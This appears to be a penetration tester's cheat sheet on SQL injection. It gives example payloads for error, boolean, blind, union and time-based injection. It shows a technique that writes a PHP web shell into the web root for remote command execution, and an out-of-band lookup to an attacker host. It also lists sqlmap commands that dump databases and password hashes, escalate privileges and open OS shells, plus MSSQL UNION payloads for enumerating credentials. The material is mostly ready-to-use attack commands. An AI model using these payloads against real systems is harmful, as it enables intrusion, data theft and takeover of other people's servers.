# Resources
https://sqlwiki.netspi.com/#mysql
[SQL Injection Payload List - PayloadBox](https://github.com/payloadbox/sql-injection-payload-list) - Payloads

# Basics

>[!INFO] What is a SQL Injection ?
SQL Injection (SQLi) is a type of an **injection attack** that makes it possible to execute malicious SQL statements. These statements control a database server behind a web application. Attackers can use SQL Injection vulnerabilities to bypass application security measures.

## Types

### Error based

Forcing the database to perform some operation in which the result will be an **error**. Then try to extract some data from the database and show it in the error message.

#### Example

```
https://www.example.beaglesecurity.com/gallery.php?id=6'
```

### Boolean based

Relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a **TRUE** or **FALSE** result.

#### Example

```
https://www.example.beaglesecurity.com/gallery.php?id=6' AND 1=1 --+
```

### Blind-based

Sending **payloads**, observing the web application’s response and the resulting behavior of the database server. **Check payloads**.

#### Example

```
https://example.com/products.aspx?id=1;EXEC master..xp_dirtree '\\test.attacker.com\' --
```

### Union based

UNION-based attacks allow the tester to easily **extract information from the database**. Because the UNION operator can only be used if both queries have the exact same structure, the attacker must craft a SELECT statement similar to the original query.

#### Example

```
https://example.com/products.aspx?id=1' UNION SELECT passwords from users;
```

### Time based

Forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is **TRUE** or **FALSE**.

#### Example

```
https://example.com/products.aspx?id=1' and if(substring(user(),2,1)='a',SLEEP(5),1)--
```

## SQLi to RCE

### Using XAMP

```php
# Inject cmd parameter
' union select 1,<php_payload>,3,4 into outfile <path> --
' union select 1,'<?php system($_GET["cmd"]); ?>',3,4 intooutfile 'C:\\xampp\\htdocs\\rce.php' --

# Reverse Shell created. Access from outside :
<host>/rce.php?cmd=<command>

# Test :
127.0.0.1/rce.php?cmd=time
# Result : The current time is: 16:22:25.20 Enter the new time: 3 4
```
- [kayran.io](https://kayran.io/blog/web-vulnerabilities/sqli-to-rce)

# SQLmap

>[!What is SQLmap ?]
**sqlmap** goal is to detect and take advantage of **SQL injection vulnerabilities** in web applications. Once it detects one or more SQL injections on the target host, the user can choose among a variety of options to perform an extensive back-end database management system **fingerprint**, **retrieve** DBMS **session** user and database, **enumerate** users, password hashes, privileges, databases, dump entire or user’s specific DBMS tables/columns, run his own SQL statement, read specific files on the file system and more.

[SQLMap cheatsheet](https://thedarksource.com/sqlmap-cheat-sheet)

# Usage
## Dumping tables

[Dumping tables using SQLmap](https://rnehra01.github.io/Dumping-tables-using-sqlmap)

## Examples

* Target the _http://target.server.com_ URL using the **-u** flag:

```bash
sqlmap -u 'http://target.server.com'
```

* Specify POST requests by specifying the **-data** flag:

```bash
sqlmap -u "http://10.10.155.76/login.php" -method "POST" -data "log_email=cun@gmail.com&log_password=123456&login_button=Login" --dbs
```

* Target a vulnerable parameter in an authenticated session by specifying cookies using the **-cookie** flag:

```bash
sqlmap -u 'http://target.server.com' --cookie='JSESSIONID=09h76qoWC559GH1K7D- SQHx'
```

* Drop all Set-Cookie requests from the target web server using the **-drop-set-cookie** flag:

```bash
sqlmap -u 'http://target.server.com' -r req.txt --drop-set-cookie
```

* Perform in-depth and risky attacks using the **-level** and **-risk** flags:

```bash
sqlmap -u 'http://target.server.com' --data='param1=blah' --level=5 --risk=3
```

* Specify which POST or GET parameter to target using the **-p** flag:

```bash
sqlmap -u 'http://target.server.com' --data='param1=blah&param2=blah' -p param1
```

* Choose a random User-Agent request header using the **–random-agent** flag:

```bash
sqlmap -u 'http://target.server.com' -r req.txt --random-agent
```

* Target a certain database service using the **–dbms** flag:

```bash
sqlmap -u 'http://target.server.com' -r req.txt --dbms Oracle
```

* Read a request (stored via Burpsuite) target the user parameter (and no other parameters), run risky queries, and dump users and passwords:

```bash
sqlmap -r ./req.txt -p user --level=1 --risk=3 --passwords
```

* Attempt privilege escalation on the target database

```bash
sqlmap -r ./req.txt --level=1 --risk=3 --privesc
Run the “whoami” command on the target server.
sqlmap -r ./req.txt --level=1 --risk=3 --os-cmd=whoami
```

Dump everything in the database, but wait one second in-between requests.

```bash
sqlmap -r ./req.txt --level=1 --risk=3 --dump --delay=1
```

## Post-Exploit

* Error-Based SQLi, dump all data from a MSSQL Database :

```bash
sqlmap -r req --technique=E -U <user> --level 5 --risk 3 --tamper=space2comment --dbms=MSSQL -D <db> --dump
```

## Flags

_Here are some useful options for your pillaging pleasure:_
`-r req.txt` Specify a request stored in a text file, great for saved requests from BurpSuite.
`--force-ssl` Force SQLmap to use SSL or TLS for its requests.
`--level=1` only test against the specified parameter, ignore all others.
`--risk=3` Run all exploit attempts, even the dangerous ones (could damage database).
`--delay` Set a delay in-between requests, great for throttled connections.
`--proxy` Set to http://127.0.0.1:8080 to pipe requests through BurpSuite for inspection.
`--privesc` Attempt to elevate the privileges of the database service account.
`--all` Enumerate everything inside the target database.
`--hostname` Print the target database’s hostname.
`--passwords` Find and exfiltrate all users and their password hashes or digests.
`--dbs` Enumerate all databases accessible via the target webserver.
`--comments` Enumerate all found comments inside the database.
`--sql-shell` Return a SQL prompt for interaction.
`--os-cmd` Attempt to execute a system command.
`--os-shell` Attempt to return a command prompt or terminal for interaction.
`--reg-read` Read the specified Windows registry key value.
`--file-write` Specify a local file to be written to the target server.
`--file-dest` Specify the remote destination to write a file to.
`--technique=` Specify a letter or letters of BEUSTQ to control the exploit attempts:
* `B` : Boolean-based blind
* `E` : Error-based
* `U` : Union query-based
* `S` : Stacked queries
* `T` : Time-based blind
* `Q` : Inline queries

# Enumerate the database
## UNION-BASED
>If we have a UNION-BASED SQLi, then this could be easy. Here a few payloads to gather information about a target, without using sqlmap (too noisy).
>The SELECT statement with 'NULL' could be different! Depends on how many columns we have on the request.

- Check which current SQL user is used :
```sql
UNION ALL SELECT null,CURRENT_USER,null,null,null--
```

- Check the account in whose context the server services are running in :
```sql
UNION ALL SELECT null,servicename,service_account,null,null FROM sys.dm_server_services--
```

- Check for other database principals :
```sql
UNION ALL SELECT null,name,null,null,null FROM sys.database_principals--
```

- Check if the current user have any permissions over this account :
```sql
UNION SELECT null,entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT,null,null FROM fn_my_permissions('daedalus_admin', 'USER');--
```

- The user have **IMPERSONATE** permissions. Identify the SQL credentials and proxy account that allows the account to execute these jobs :
```sql
UNION ALL SELECT null,name,credential_identity,null,null FROM sys.credentials--
```